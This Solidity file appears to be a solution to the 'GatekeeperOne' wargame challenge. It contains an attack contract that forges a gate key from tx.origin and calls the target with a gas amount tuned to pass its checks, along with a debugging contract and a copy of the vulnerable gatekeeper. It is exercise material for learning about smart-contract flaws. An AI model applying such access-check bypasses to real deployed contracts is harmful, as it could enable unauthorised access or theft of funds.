// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackKeeper {
    GatekeeperOne public immutable gatekeeper;
    uint16 public txOrigin;

    constructor(address _gatekeeper) {
        gatekeeper = GatekeeperOne(_gatekeeper);
    }

    function attack(uint256 gas) external {
        txOrigin = uint16(uint160(tx.origin));
        //type(uint32).max + 1 + txOrigin;
        uint64 gateKey = 4294967296 + txOrigin;

        //gas should be 256
        //8191 * 10  - multiple of 8191
        bool hasEntererd = gatekeeper.enter{gas: 8191 * 10 + gas}(bytes8(gateKey));
        require((hasEntererd), "Didn't enter gatekeeper!");
    }
}

//=================================
contract TestKeeper {
    uint32 public int32GateKey;
    uint16 public int16GateKey;
    uint64 public int64GateKey;
    uint16 public txOrigin;
    uint256 public gasLeft;
    bool public firstOk;
    bool public secondOk;
    bool public thirdOk;
    bool public gasOk;

    function enter(bytes8 _gateKey) external {
        int32GateKey = uint32(uint64(_gateKey));
        int16GateKey = uint16(uint64(_gateKey));
        int64GateKey = uint64(_gateKey);
        txOrigin = uint16(uint160(tx.origin));

        if (int32GateKey == int16GateKey) {
            firstOk = true;
        }

        if (int32GateKey != int64GateKey) {
            secondOk = true;
        }

        if (int32GateKey == txOrigin) {
            thirdOk = true;
        }

        gasLeft = gasleft();
        if (gasleft() % 8191 == 0) {
            gasOk = true;
        }
    }
}

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
